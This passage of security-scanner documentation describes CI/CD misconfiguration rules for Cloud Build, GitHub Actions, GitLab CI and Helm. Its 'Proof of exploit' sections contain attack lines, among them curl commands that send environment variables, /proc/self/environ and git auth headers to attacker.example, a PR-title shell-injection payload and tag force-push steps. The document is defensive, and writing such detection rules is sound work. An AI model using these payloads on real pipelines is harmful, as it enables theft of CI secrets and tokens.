**How this is detected.** Cloud Build's step dependency graph is built from each step's ``waitFor:`` array. A step with no ``waitFor:`` runs after all previous steps; a step with ``waitFor: ['-']`` runs at the start of the build; a step with ``waitFor: ['<id>']`` waits for the specific step. There's no validation that the referenced id exists, typo'd ids are silently treated like ``-`` (no-wait), so the dependency disappears without warning. This rule catches the silent-skip by walking every ``waitFor:`` value and cross-referencing it against the set of declared step ids.

**Recommendation.** Verify every ID listed in a step's ``waitFor:`` array matches an ``id:`` declared on a sibling step in the same build. The special token ``-`` (start at the beginning of the build, no dependencies) is the only non-id value Cloud Build accepts. A typo in ``waitFor:`` doesn't fail the build, Cloud Build silently skips the wait, so a step that was supposed to run *after* a setup step ends up running in parallel with it.

**Source:** [`GCB-026`](../providers/cloudbuild.md#gcb-026) in the [Cloud Build provider](../providers/cloudbuild.md).

#### `GHA-001`: Action not pinned to commit SHA <span class="pg-sev pg-sev--high">HIGH</span> <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> { #detail-gha-001 }

**Evidences:** [`1.4.1`](#ctrl-1-4-1) Ensure third-party artifacts and open-source libraries are verified, [`3.1.5`](#ctrl-3-1-5) Ensure only trusted package managers and repositories are used.

**How this is detected.** Every `uses:` reference should pin a specific 40-char commit SHA. Tag and branch refs (`@v4`, `@main`) can be silently moved to malicious commits by whoever controls the upstream repository, a third-party action compromise will propagate into the pipeline on the next run.

**Recommendation.** Replace tag/branch references (`@v4`, `@main`) with the full 40-char commit SHA. Use Dependabot or StepSecurity to keep the pins fresh.

**Autofix.** `pipeline_check --fix` will patch this finding automatically. Review the diff before committing; the fixer applies the conservative remediation pattern (e.g. swap a floating tag for the digest it currently resolves to), not the most aggressive one.

**Seen in the wild.**

- tj-actions/changed-files compromise ([CVE-2025-30066](https://www.cve.org/CVERecord?id=CVE-2025-30066), March 2025): a malicious commit retagged behind ``@v1`` / ``@v45`` shipped CI-secret exfiltration to roughly 23,000 repos that had pinned the action to a mutable tag instead of a commit SHA.
- reviewdog/action-setup compromise ([CVE-2025-30154](https://www.cve.org/CVERecord?id=CVE-2025-30154), March 2025): same week, similar mechanism. Tag-pinned consumers auto-pulled the malicious version; SHA-pinned consumers were unaffected.

**Proof of exploit.**

# Tag-pinned reference (vulnerable):
- uses: tj-actions/changed-files@v45

# Attack: the upstream maintainer (or anyone who compromises
# the upstream repo) force-moves the v45 tag to a malicious
# commit:
#   git tag -f v45 <attacker-controlled-sha>
#   git push --force origin v45
# Every consumer's next workflow run pulls the new code
# automatically, executing the attacker's payload with the
# job's secrets and GITHUB_TOKEN in scope.

# Safe: pin to a 40-char commit SHA (immutable):
- uses: tj-actions/changed-files@a284dc1814e3fdd1a3a7f16c11f02e2cd5a98f93  # v45.0.0

**Source:** [`GHA-001`](../providers/github.md#gha-001) in the [GitHub Actions provider](../providers/github.md).

#### `GHA-002`: pull_request_target checks out PR head <span class="pg-sev pg-sev--critical">CRITICAL</span> <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> { #detail-gha-002 }

**Evidences:** [`2.1.3`](#ctrl-2-1-3) Ensure the build environment is hardened, [`2.3.8`](#ctrl-2-3-8) Ensure pipeline configuration files are reviewed before execution.

**How this is detected.** `pull_request_target` runs with a write-scope GITHUB_TOKEN and access to repository secrets, deliberately so, since it's how labeling and comment-bot workflows work. When the same workflow then explicitly checks out the PR head (`ref: ${{ github.event.pull_request.head.sha }}` or `.ref`) it executes attacker-controlled code with those privileges.

**Recommendation.** Use `pull_request` instead of `pull_request_target` for any workflow that must run untrusted code. If you need write scope, split the workflow: a `pull_request_target` job that labels the PR, and a separate `pull_request`-triggered job that builds it with read-only secrets.

**Autofix.** `pipeline_check --fix` will patch this finding automatically. Review the diff before committing; the fixer applies the conservative remediation pattern (e.g. swap a floating tag for the digest it currently resolves to), not the most aggressive one.

**Seen in the wild.**

- GitHub Security Lab: [Preventing pwn requests](https://securitylab.github.com/research/github-actions-preventing-pwn-requests/) (2020), the canonical write-up. Demonstrates how a fork PR that lands in a ``pull_request_target`` workflow with the PR head checked out runs in the base repo's privileged context.
- [Keeping your GitHub Actions and workflows secure: Untrusted input](https://securitylab.github.com/resources/github-actions-untrusted-input/) (GitHub Security Lab, 2020): catalogued real-world Actions carrying the same primitive. The fix pattern (split the workflow into a privileged labeler + an unprivileged builder) is now standard guidance.

**Proof of exploit.**

# Vulnerable: pull_request_target + checkout PR head =
# attacker code runs with secrets + write-scope token.
name: build-pr
on:
  pull_request_target:
    branches: [main]
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@<sha>
        with:
          ref: ${{ github.event.pull_request.head.sha }}
      - run: make test            # runs PR-head Makefile

# Attack: any external contributor opens a fork PR with a
# tampered Makefile:
#
#   test:
#   	curl -X POST https://attacker.example/exfil \
#   	  -d "$(env)" \
#   	  -d "$(git config --get-all http.https://github.com/.extraheader)"
#
# CI runs the malicious target with the base repo's secrets
# (every ${{ secrets.* }} the workflow has access to) and a
# write-scope GITHUB_TOKEN. The PR doesn't even need to be
# merged or reviewed — the privileged execution happens at
# PR-open time.

# Safe: split the workflow. The labeler runs with secrets
# but never checks out PR head; the builder runs in
# ``pull_request`` context with no secrets:
name: triage      # privileged half
on: { pull_request_target: { types: [opened, synchronize] } }
jobs:
  label:
    runs-on: ubuntu-latest
    steps:
      - run: gh pr edit ${{ github.event.number }} --add-label triage
        env:
          GH_TOKEN: ${{ github.token }}
---
name: build       # unprivileged half
on: { pull_request: {} }
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@<sha>     # checks out PR head
      - run: make test                    # no secrets in scope

**Source:** [`GHA-002`](../providers/github.md#gha-002) in the [GitHub Actions provider](../providers/github.md).

#### `GHA-003`: Script injection via untrusted context <span class="pg-sev pg-sev--high">HIGH</span> <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> { #detail-gha-003 }

**Evidences:** [`2.1.3`](#ctrl-2-1-3) Ensure the build environment is hardened.

**How this is detected.** Interpolating attacker-controlled context fields (PR title/body, issue body, comment body, commit message, discussion body, head branch name, `github.ref_name`, `inputs.*`, release metadata, deployment payloads) directly into a `run:` block is shell injection. GitHub expands `${{ ... }}` BEFORE shell quoting, so any backtick, `$()`, or `;` in the source field executes.

**Recommendation.** Pass untrusted values through an intermediate `env:` variable and reference that variable from the shell script. GitHub's expression evaluation happens before shell quoting, so inline `${{ github.event.* }}` is always unsafe.

**Autofix.** `pipeline_check --fix` will patch this finding automatically. Review the diff before committing; the fixer applies the conservative remediation pattern (e.g. swap a floating tag for the digest it currently resolves to), not the most aggressive one.

**Seen in the wild.**

- [GitHub Security Lab disclosure](https://securitylab.github.com/research/github-actions-untrusted-input/) (2020): a sweep of public Actions found dozens of widely-used workflows interpolating ``github.event.issue.title`` / ``pull_request.title`` directly into shell. Any commenter or PR author could run arbitrary commands in the maintainer's CI.
- [Keeping your GitHub Actions and workflows secure: Preventing pwn requests](https://securitylab.github.com/resources/github-actions-preventing-pwn-requests/) (GitHub Security Lab, 2020): the same primitive against ``pull_request_target`` workflows where the runner has secrets and a write-scope token; one fork PR exfiltrates every secret the workflow can see. Mitigation: never interpolate context into shell, route through ``env:``.

**Proof of exploit.**

# Vulnerable: PR title interpolated straight into shell.
name: triage
on:
  pull_request_target:
    types: [opened, edited]
jobs:
  greet:
    runs-on: ubuntu-latest
    steps:
      - run: |
          echo "New PR: ${{ github.event.pull_request.title }}"

# Attack: open a PR with the title:
#
#   foo"; curl -X POST https://attacker.example/exfil \
#         -d "$(env | base64 -w0)"; echo "
#
# GitHub expands ``${{ ... }}`` BEFORE shell quoting, so the
# title's `"` closes the echo string and the rest of the line
# becomes shell. The pull_request_target trigger means the
# runner already has secrets and a write-scope GITHUB_TOKEN,
# so the curl exfils every secret the workflow can see.

# Safe: route through env so the value is never interpolated
# into the shell template:
      - env:
          PR_TITLE: ${{ github.event.pull_request.title }}
        run: |
          echo "New PR: $PR_TITLE"

**Source:** [`GHA-003`](../providers/github.md#gha-003) in the [GitHub Actions provider](../providers/github.md).

#### `GHA-004`: Workflow has no explicit permissions block <span class="pg-sev pg-sev--medium">MEDIUM</span> <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> { #detail-gha-004 }

**Evidences:** [`2.4.3`](#ctrl-2-4-3) Ensure access to the pipeline execution environment is restricted.

**How this is detected.** Without an explicit `permissions:` block (either top-level or per-job), the GITHUB_TOKEN inherits the repository's default scope, typically `write`. A compromised step receives far more privilege than it needs.

**Recommendation.** Add a top-level `permissions:` block (start with `contents: read`) and grant additional scopes only on the specific jobs that need them.

**Autofix.** `pipeline_check --fix` will patch this finding automatically. Review the diff before committing; the fixer applies the conservative remediation pattern (e.g. swap a floating tag for the digest it currently resolves to), not the most aggressive one.

**Known false positives.**

- Read-only / lint-only workflows that do not call any write-scoped API often pass without an explicit block because the default token scope on public repos is read. The rule defaults to MEDIUM confidence to reflect this.

**Source:** [`GHA-004`](../providers/github.md#gha-004) in the [GitHub Actions provider](../providers/github.md).

#### `GHA-005`: AWS auth uses long-lived access keys <span class="pg-sev pg-sev--medium">MEDIUM</span> <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> { #detail-gha-005 }

**Evidences:** [`1.3.4`](#ctrl-1-3-4) Ensure organization identity is required for contribution (no long-lived personal tokens).

**How this is detected.** Long-lived `AWS_ACCESS_KEY_ID` / `AWS_SECRET_ACCESS_KEY` secrets in GitHub Actions can't be rotated on a fine-grained schedule and remain valid until manually revoked. OIDC with `role-to-assume` yields short-lived credentials per workflow run.

**Recommendation.** Use `aws-actions/configure-aws-credentials` with `role-to-assume` + `permissions: id-token: write` to obtain short-lived credentials via OIDC. Remove the static AWS_ACCESS_KEY_ID / AWS_SECRET_ACCESS_KEY secrets.

**Autofix.** `pipeline_check --fix` will patch this finding automatically. Review the diff before committing; the fixer applies the conservative remediation pattern (e.g. swap a floating tag for the digest it currently resolves to), not the most aggressive one.

**Known false positives.**

- LocalStack and Moto integration tests set ``AWS_ENDPOINT_URL`` to a localhost address and use the sentinel ``test`` / ``test`` access keys (the LocalStack convention). Those values can't authenticate against real AWS, so the rule auto-suppresses an env block that pairs a localhost endpoint with sentinel keys.

**Source:** [`GHA-005`](../providers/github.md#gha-005) in the [GitHub Actions provider](../providers/github.md).

#### `GHA-006`: Artifacts not signed (no cosign/sigstore step) <span class="pg-sev pg-sev--medium">MEDIUM</span> { #detail-gha-006 }

**Evidences:** [`4.1.1`](#ctrl-4-1-1) Ensure all artifacts on all releases are verified (signed, integrity-checked).

**How this is detected.** Unsigned artifacts cannot be verified downstream, so a tampered build is indistinguishable from a legitimate one. The check recognizes cosign, sigstore, slsa-github-generator, slsa-framework, and notation-sign as signing tools.

**Recommendation.** Add a signing step, e.g. `sigstore/cosign-installer` followed by `cosign sign`, or `slsa-framework/slsa-github-generator` for keyless SLSA provenance. Publish the signature alongside the artifact and verify it at consumption time.

**Seen in the wild.**

- [SolarWinds Orion compromise](https://www.cisa.gov/news-events/cybersecurity-advisories/aa20-352a) (December 2020): SUNBURST trojanized builds shipped to ~18,000 customers because no post-build signature could be checked against a trusted signing identity. Cryptographic signing on every release would have given downstream consumers a verifiable break with the upstream key, the absence of which was the ambient signal of compromise.
- [PyTorch nightly compromise](https://pytorch.org/blog/compromised-nightly-dependency/) (December 2022): the ``torchtriton`` dependency was hijacked via PyPI dependency-confusion. Sigstore-style attestation tied to the official publisher would have made the impostor build fail verification rather than silently install.

**Source:** [`GHA-006`](../providers/github.md#gha-006) in the [GitHub Actions provider](../providers/github.md).

#### `GHA-007`: SBOM not produced (no CycloneDX/syft/Trivy-SBOM step) <span class="pg-sev pg-sev--medium">MEDIUM</span> { #detail-gha-007 }

**Evidences:** [`4.4.1`](#ctrl-4-4-1) Ensure artifacts have provenance/SBOM metadata.

**How this is detected.** Without an SBOM, downstream consumers cannot audit the exact set of dependencies shipped in the artifact, delaying vulnerability response when a transitive dep is disclosed. The check recognizes CycloneDX, syft, Anchore SBOM action, spdx-sbom-generator, Microsoft sbom-tool, and Trivy in SBOM mode.

**Recommendation.** Add an SBOM generation step, `anchore/sbom-action`, `syft . -o cyclonedx-json`, Trivy with `--format cyclonedx`, or Microsoft's `sbom-tool`. Attach the SBOM to the release so consumers can ingest it into their vuln-management pipeline.

**Source:** [`GHA-007`](../providers/github.md#gha-007) in the [GitHub Actions provider](../providers/github.md).

#### `GHA-040`: Action reference matches a known-compromised SHA or tag <span class="pg-sev pg-sev--critical">CRITICAL</span> { #detail-gha-040 }

**Evidences:** [`1.4.1`](#ctrl-1-4-1) Ensure third-party artifacts and open-source libraries are verified, [`3.1.3`](#ctrl-3-1-3) Ensure signed metadata of dependencies is verified.

**How this is detected.** Walks every workflow's ``steps[].uses:`` and ``jobs.<id>.uses:`` references against the curated compromised-action registry in ``pipeline_check.core.checks.github._compromised_actions``. Match is case-insensitive on owner / repo and exact on the ``ref`` value (commit SHA or tag name). Registry is deliberately small and append-only — refresh by PR with the citing advisory in the commit message; no fetch-from-network registry to avoid taking on a telemetry surface.

**Recommendation.** Rotate every secret that may have been reachable to a workflow run that hit the compromised reference, then update the ``uses:`` reference to a known-clean SHA published by the upstream maintainer post-incident (usually announced in the advisory body). Audit CI logs for the affected window for any sign that the malicious payload ran against this repo.

**Known false positives.**

- The registry covers only public, advisory-confirmed compromises. Pre-disclosure compromises and yet-unpublished maintainer-account takeovers do not land until the citing CVE / GHSA exists. Pair with GHA-001 (SHA pinning) and GHA-025 (tag-rewrite detection) for the prevention angle.

**Seen in the wild.**

- tj-actions/changed-files compromise ([CVE-2025-30066](https://www.cve.org/CVERecord?id=CVE-2025-30066), March 2025): the canonical case the registry was built for. Roughly 23,000 tag-pinned repos shipped CI secrets to an exfiltration endpoint over a ~24-hour window before GitHub blocked the malicious commits.
- reviewdog/action-setup compromise ([CVE-2025-30154](https://www.cve.org/CVERecord?id=CVE-2025-30154), March 2025): same week as tj-actions; smaller blast radius but identical mechanism. Tag-pinned consumers were affected; SHA-pinned consumers who happened to match the malicious commit were also affected.

**Proof of exploit.**

# Vulnerable: pinned to a SHA the attacker landed under @v45.
# (Substitute the actual malicious-commit SHA from the CVE-2025-30066
# advisory; the registry in _compromised_actions.py carries it.)
- uses: tj-actions/changed-files@<advisory-malicious-sha>

# Same applies to tag pins that resolved to the malicious
# commit during the compromise window:
- uses: tj-actions/changed-files@v45     # WAS pointing at the bad commit

# Attack: the injected action body exfiltrated CI secrets by
# dumping the runner process environment to a controlled host:
#   curl -X POST https://attacker.example/exfil \
#     -d "$(cat /proc/self/environ)"
#
# Every workflow run that hit one of those refs over the
# compromise window leaked the entire env block, including
# ${{ secrets.* }} and GITHUB_TOKEN.

# Safe: pin to the post-incident clean SHA the maintainer
# republished in the advisory (consult the GHSA the registry
# cites for the exact value):
- uses: tj-actions/changed-files@<advisory-clean-sha>

**Source:** [`GHA-040`](../providers/github.md#gha-040) in the [GitHub Actions provider](../providers/github.md).

#### `GHA-041`: Action upstream repo has a single contributor <span class="pg-sev pg-sev--medium">MEDIUM</span> { #detail-gha-041 }

**Evidences:** [`3.1.3`](#ctrl-3-1-3) Ensure signed metadata of dependencies is verified.

**How this is detected.** Reads the contributor count from ``ctx.action_metadata[owner/repo].contributor_count`` (populated by the ``--resolve-remote`` path; the GitHub REST ``/contributors`` endpoint, capped at two entries — the rule only cares about == 1). When the fetch failed or the flag is off, the rule passes silently. Forks and archived repos that ALSO have a single contributor fire the rule; the fork / archived state is part of the same supply-chain risk story.

**Recommendation.** Audit the action repo's contributor list. If the repo genuinely has one maintainer, pin to a vendored fork under your org's control (so a future compromise on the upstream doesn't reach your build runtime) or move to a first-party action covering the same surface. The single-maintainer pattern is what made tj-actions / reviewdog one-day compromises so widely-blast.

**Known false positives.**

- Some well-maintained single-author actions (high-quality personal-account repos that the maintainer simply hasn't open-sourced governance for) are not actually compromised. Suppress via ignore-file when a security review has confirmed the maintainer's identity and 2FA posture.

**Seen in the wild.**

- tj-actions / reviewdog March 2025 compromises (CVE-2025-30066 / CVE-2025-30154): both upstream repos had a single primary contributor at the time of compromise. The single-maintainer pattern was central to the blast radius (no second pair of eyes on the malicious commit, no auto-rollback when the tag move landed).

**Source:** [`GHA-041`](../providers/github.md#gha-041) in the [GitHub Actions provider](../providers/github.md).

#### `GHA-042`: Action upstream repo is newly created <span class="pg-sev pg-sev--medium">MEDIUM</span> { #detail-gha-042 }

**Evidences:** [`3.1.3`](#ctrl-3-1-3) Ensure signed metadata of dependencies is verified.

**How this is detected.** Reads ``created_at`` from ``ctx.action_metadata[owner/repo]`` (populated by the ``--resolve-remote`` path). Fires when the repo's age in days is below ``MIN_AGE_DAYS`` (90). Without the opt-in flag the rule passes silently with a nudge.

**Recommendation.** Verify the action repo is the real upstream and not a typosquat. Compare the spelling and owner against the intended action (``actions/checkout`` vs ``actoins/checkout``); check the repo description, stars, and prior releases. If the action is genuinely new but trusted, suppress via ignore-file with a dated note; the suppression decays naturally as the repo ages past the 90-day threshold.

**Known false positives.**

- Newly-released first-party actions from a trusted org (say, a freshly-launched ``actions/foo`` rolled out by GitHub itself) fire while they're still young. Suppress via ignore-file with a dated note; the entry expires naturally once the repo crosses the age threshold.

**Seen in the wild.**

- GitGuardian / StepSecurity typosquat reports (2023-2024) document several action-naming impersonations that appeared as newly-registered repos and reached production CI before the legitimate owner was notified.

**Source:** [`GHA-042`](../providers/github.md#gha-042) in the [GitHub Actions provider](../providers/github.md).

#### `GHA-043`: Low-star action runs with sensitive permissions <span class="pg-sev pg-sev--high">HIGH</span> { #detail-gha-043 }

**Evidences:** [`3.1.3`](#ctrl-3-1-3) Ensure signed metadata of dependencies is verified.

**How this is detected.** Reads ``stargazers_count`` from ``ctx.action_metadata[owner/repo]`` and the effective ``permissions:`` block (job-level wins; falls back to workflow-top-level; falls back to the caller's inherited block for resolved reusable workflows). Fires when stars < ``MAX_STARS`` (25) AND any of 'contents', 'packages', 'id-token', 'actions', 'deployments' is set to ``write`` on the calling job. ``permissions: write-all`` is treated as all scopes set to write.

**Recommendation.** Either narrow the calling job's ``permissions:`` to the minimum the action actually needs (drop ``contents: write`` / ``id-token: write`` / ``packages: write`` / ``actions: write`` / ``deployments: write`` unless the action's documented surface requires them), or replace the action with a community-reviewed alternative. The rule fires the COMBINATION of low community review and elevated permissions; either side alone is fine.

**Known false positives.**

- Internal first-party actions hosted in a private org repo legitimately have low public star counts; their threat model is different and the rule does not distinguish internal from third-party. Suppress via ignore-file when the action is in-org and trusted.

**Seen in the wild.**

- GitGuardian 2023 supply-chain audit: a handful of low-popularity actions with ``contents: write`` were weaponized via single-PR maintainer-impersonation compromises; the elevated permission was the privilege amplifier that let the attacker push code back to the victim's default branch on the same workflow run.

**Source:** [`GHA-043`](../providers/github.md#gha-043) in the [GitHub Actions provider](../providers/github.md).

#### `GHA-047`: Action ref resolves to a recently committed tag or SHA <span class="pg-sev pg-sev--medium">MEDIUM</span> { #detail-gha-047 }

**Evidences:** [`3.1.3`](#ctrl-3-1-3) Ensure signed metadata of dependencies is verified.

**How this is detected.** Reads ``ref_committed_at`` from ``ctx.action_metadata[owner/repo]`` (populated by the ``--resolve-remote`` path via ``GET /repos/{owner}/{repo}/commits/{ref}``). Fires when the referenced ref's commit date is younger than ``MIN_REF_AGE_DAYS`` (7). Trusted publishers (``actions``, ``aws-actions``, ``azure``, ...) are skipped by default to avoid firing on legitimate retags of floating majors; pin to a SHA to opt those back in. Without ``--resolve-remote`` the rule passes silently with a discovery nudge.

**Recommendation.** Wait until the referenced tag or commit has had time to be reviewed by the upstream community before pulling it into CI. The default cooldown is seven days. Either bump the pinned ref to an older release, or wait 7 days and re-run. If the action is internal / first-party and the freshness gate is unwanted, pin to a 40-char commit SHA — SHA pins don't move under a retag and are the preferred long-term mitigation.

**Known false positives.**

- A legitimate first-party action that's outside the default trusted-publisher allowlist (a small vendor org that publishes a real action; you'd like it included) will fire after every release for the cooldown window. Either pin to a SHA (preferred) or suppress via ignore-file with a dated note; the suppression decays once the ref ages past the threshold.

**Seen in the wild.**

- Multiple action-tag compromises (ua-parser-js npm 2021, tj-actions/changed-files 2025) followed the same shape: a tag was re-pointed at a malicious commit and consumers pulling on the next CI run executed the payload. Cooldown gating turns the community-detection window into a defense.

**Source:** [`GHA-047`](../providers/github.md#gha-047) in the [GitHub Actions provider](../providers/github.md).

#### `GL-001`: Image not pinned to specific version or digest <span class="pg-sev pg-sev--high">HIGH</span> <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> { #detail-gl-001 }

**Evidences:** [`1.4.1`](#ctrl-1-4-1) Ensure third-party artifacts and open-source libraries are verified, [`3.1.5`](#ctrl-3-1-5) Ensure only trusted package managers and repositories are used.

**How this is detected.** Floating tags (`latest` or major-only) can be silently swapped under the job. Every `image:` reference should pin a specific version tag or digest.

**Recommendation.** Reference images by `@sha256:<digest>` or at minimum a full immutable version tag (e.g. `python:3.12.1-slim`). Avoid `:latest` and bare tags like `:3`.

**Autofix.** `pipeline_check --fix` will patch this finding automatically. Review the diff before committing; the fixer applies the conservative remediation pattern (e.g. swap a floating tag for the digest it currently resolves to), not the most aggressive one.

**Source:** [`GL-001`](../providers/gitlab.md#gl-001) in the [GitLab CI provider](../providers/gitlab.md).

#### `GL-002`: Script injection via untrusted commit/MR context <span class="pg-sev pg-sev--high">HIGH</span> { #detail-gl-002 }

**Evidences:** [`2.1.3`](#ctrl-2-1-3) Ensure the build environment is hardened, [`2.3.8`](#ctrl-2-3-8) Ensure pipeline configuration files are reviewed before execution.

**How this is detected.** CI_COMMIT_MESSAGE / CI_COMMIT_REF_NAME / CI_MERGE_REQUEST_TITLE and friends are populated from SCM event metadata the attacker controls. Interpolating them into a shell body executes the crafted content as part of the build.

**Recommendation.** Read these values into intermediate `variables:` entries or shell variables and quote them defensively (`"$BRANCH"`). Never inline `$CI_COMMIT_MESSAGE` / `$CI_MERGE_REQUEST_TITLE` into a shell command.

**Source:** [`GL-002`](../providers/gitlab.md#gl-002) in the [GitLab CI provider](../providers/gitlab.md).

#### `GL-003`: Variables contain literal secret values <span class="pg-sev pg-sev--critical">CRITICAL</span> { #detail-gl-003 }

**Evidences:** [`2.3.4`](#ctrl-2-3-4) Ensure pipelines are scanned for secrets and sensitive data, [`2.4.3`](#ctrl-2-4-3) Ensure access to the pipeline execution environment is restricted.

**How this is detected.** Scans `variables:` at the top level and on each job for entries whose KEY looks credential-shaped and whose VALUE is a literal string (not a `$VAR` reference). AWS access keys are detected by value pattern regardless of key name.

**Recommendation.** Store credentials as protected + masked CI/CD variables in project or group settings, and reference them by name from the YAML. For cloud access prefer short-lived OIDC tokens.

**Source:** [`GL-003`](../providers/gitlab.md#gl-003) in the [GitLab CI provider](../providers/gitlab.md).

#### `GL-004`: Deploy job lacks manual approval or environment gate <span class="pg-sev pg-sev--medium">MEDIUM</span> { #detail-gl-004 }

**Evidences:** [`5.1.4`](#ctrl-5-1-4) Ensure deployment configuration manifests are reviewed before apply, [`5.2.1`](#ctrl-5-2-1) Ensure deployment environments are separated.

**How this is detected.** A job whose stage or name contains `deploy` / `release` / `publish` / `promote` should either require manual approval or declare an `environment:` binding. Otherwise any push to the trigger branch ships to the target.

**Recommendation.** Add `when: manual` (optionally with `rules:` for protected branches) or bind the job to an `environment:` with a deployment tier so approvals and audit are enforced by GitLab's environment controls.

**Source:** [`GL-004`](../providers/gitlab.md#gl-004) in the [GitLab CI provider](../providers/gitlab.md).

#### `GL-005`: include: pulls remote / project without pinned ref <span class="pg-sev pg-sev--high">HIGH</span> { #detail-gl-005 }

**Evidences:** [`1.4.1`](#ctrl-1-4-1) Ensure third-party artifacts and open-source libraries are verified, [`3.1.3`](#ctrl-3-1-3) Ensure signed metadata of dependencies is verified, [`3.1.5`](#ctrl-3-1-5) Ensure only trusted package managers and repositories are used.

**How this is detected.** Cross-project and remote includes can be silently re-pointed. Branch-name refs (`main`/`master`/`develop`/`head`) are treated as unpinned; tag and SHA refs are considered safe.

**Recommendation.** Pin `include: project:` entries with `ref:` set to a tag or commit SHA. Avoid `include: remote:` for untrusted URLs; mirror the content into a trusted project and pin it.

**Source:** [`GL-005`](../providers/gitlab.md#gl-005) in the [GitLab CI provider](../providers/gitlab.md).

#### `GL-006`: Artifacts not signed <span class="pg-sev pg-sev--medium">MEDIUM</span> { #detail-gl-006 }

**Evidences:** [`4.1.1`](#ctrl-4-1-1) Ensure all artifacts on all releases are verified (signed, integrity-checked).

**How this is detected.** Unsigned artifacts can't be verified downstream, so a tampered build is indistinguishable from a legitimate one. Pass when any of cosign / sigstore / slsa-* / notation-sign appears in the pipeline text.

**Recommendation.** Add a job that runs `cosign sign` (keyless OIDC with GitLab's id_tokens works out of the box) or `notation sign`. Publish the signature next to the artifact and verify it on consume.

**Source:** [`GL-006`](../providers/gitlab.md#gl-006) in the [GitLab CI provider](../providers/gitlab.md).

#### `GL-007`: SBOM not produced <span class="pg-sev pg-sev--medium">MEDIUM</span> { #detail-gl-007 }

**Evidences:** [`4.4.1`](#ctrl-4-4-1) Ensure artifacts have provenance/SBOM metadata.

**How this is detected.** Without an SBOM, downstream consumers can't audit the dependency set shipped in the artifact. Passes when CycloneDX / syft / anchore / spdx-sbom-generator / sbom-tool / Trivy-SBOM appears in the pipeline body.

**Recommendation.** Add an SBOM step, `syft . -o cyclonedx-json`, Trivy with `--format cyclonedx`, or GitLab's built-in CycloneDX dependency-scanning template. Attach the SBOM as a pipeline artifact.

**Source:** [`GL-007`](../providers/gitlab.md#gl-007) in the [GitLab CI provider](../providers/gitlab.md).

#### `HELM-001`: Chart.yaml declares legacy apiVersion: v1 <span class="pg-sev pg-sev--medium">MEDIUM</span> <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> { #detail-helm-001 }

**Evidences:** [`1.4.1`](#ctrl-1-4-1) Ensure third-party artifacts and open-source libraries are verified, [`3.1.3`](#ctrl-3-1-3) Ensure signed metadata of dependencies is verified.

**How this is detected.** ``apiVersion`` lives at the top of ``Chart.yaml``. ``v1`` is Helm 2's format and uses a sibling ``requirements.yaml`` for dependencies; ``v2`` is Helm 3's format and inlines them in ``Chart.yaml`` alongside a ``Chart.lock`` for digest pinning. Without v2 there is no in-tree dependency manifest to lock, which is why HELM-002 only fires on v2 charts.

**Recommendation.** Bump ``Chart.yaml`` to ``apiVersion: v2`` and migrate any sibling ``requirements.yaml`` entries into the ``dependencies:`` list inside ``Chart.yaml``. Run ``helm dependency update`` to regenerate ``Chart.lock`` so HELM-002's per-dependency digest check has something to read. Helm 3 has been the default shipping channel since November 2019; the v1 format is kept for read-compat but blocks lockfile-based supply-chain controls.

**Autofix.** `pipeline_check --fix` will patch this finding automatically. Review the diff before committing; the fixer applies the conservative remediation pattern (e.g. swap a floating tag for the digest it currently resolves to), not the most aggressive one.

**Source:** [`HELM-001`](../providers/helm.md) in the [Helm provider](../providers/helm.md).

#### `HELM-002`: Chart.lock missing per-dependency digests <span class="pg-sev pg-sev--high">HIGH</span> <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> { #detail-helm-002 }

**Evidences:** [`3.1.3`](#ctrl-3-1-3) Ensure signed metadata of dependencies is verified, [`4.1.1`](#ctrl-4-1-1) Ensure all artifacts on all releases are verified (signed, integrity-checked).

**How this is detected.** Three failure shapes:

1. ``Chart.yaml`` declares dependencies but no ``Chart.lock`` exists at all.
2. ``Chart.lock`` exists but its ``dependencies:`` list is missing entries declared in ``Chart.yaml`` (drift after an edit without re-running ``helm dependency update``).
3. ``Chart.lock`` lists every dependency but one or more entries lack a ``digest:`` field (lock generated by an old Helm 3 version that didn't always populate it).

v1 charts (HELM-001) are skipped. They predate ``Chart.lock`` and use ``requirements.lock`` against a sibling ``requirements.yaml``. Fix HELM-001 first.

**Recommendation.** After every change to ``dependencies:`` in ``Chart.yaml``, re-run ``helm dependency update`` and commit the regenerated ``Chart.lock``. The lock records the resolved version *and* a ``sha256:...`` digest that ``helm dependency build`` verifies on download, without it, a compromised chart repo can swap the tarball under the same version and ``helm install`` will happily use the substitute.

**Autofix.** `pipeline_check --fix` will patch this finding automatically. Review the diff before committing; the fixer applies the conservative remediation pattern (e.g. swap a floating tag for the digest it currently resolves to), not the most aggressive one.

**Known false positives.**

- Charts with no dependencies (the ``dependencies:`` key is absent or empty) pass automatically. There is nothing to lock.

**Source:** [`HELM-002`](../providers/helm.md) in the [Helm provider](../providers/helm.md).

#### `HELM-003`: Chart dependency declared on a non-HTTPS repository <span class="pg-sev pg-sev--high">HIGH</span> <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> { #detail-helm-003 }

**Evidences:** [`3.1.5`](#ctrl-3-1-5) Ensure only trusted package managers and repositories are used.

**How this is detected.** Walks ``Chart.yaml`` ``dependencies:`` (v2 charts only) and inspects each entry's ``repository:`` URL. Accepted schemes:

- ``https://``, chart-museum / OSS chart repos. The default for public Helm charts.
- ``oci://``, registry-hosted charts. TLS is enforced by the registry, not the URL scheme; we still accept this shape because Helm 3.8+ pulls OCI charts over HTTPS unless explicitly configured otherwise.
- ``file://``, in-repo dependency. No network surface.
- ``@alias``, local alias for a previously registered ``helm repo add`` URL. The scheme of the original URL is the user's responsibility (and is captured in the chart consumer's ``~/.config/helm/repositories.yaml``).

**Recommendation.** Switch each ``dependencies[].repository`` value to an ``https://`` chart repo URL, an ``oci://`` registry reference, or a ``file://`` path for in-repo charts. Plaintext ``http://`` (and other non-TLS schemes like ``git://``) lets any on-path attacker substitute the dependency tarball during ``helm dependency build``; ``Chart.lock``'s digest check (HELM-002) only catches that on the *next* update, not the compromised pull itself.

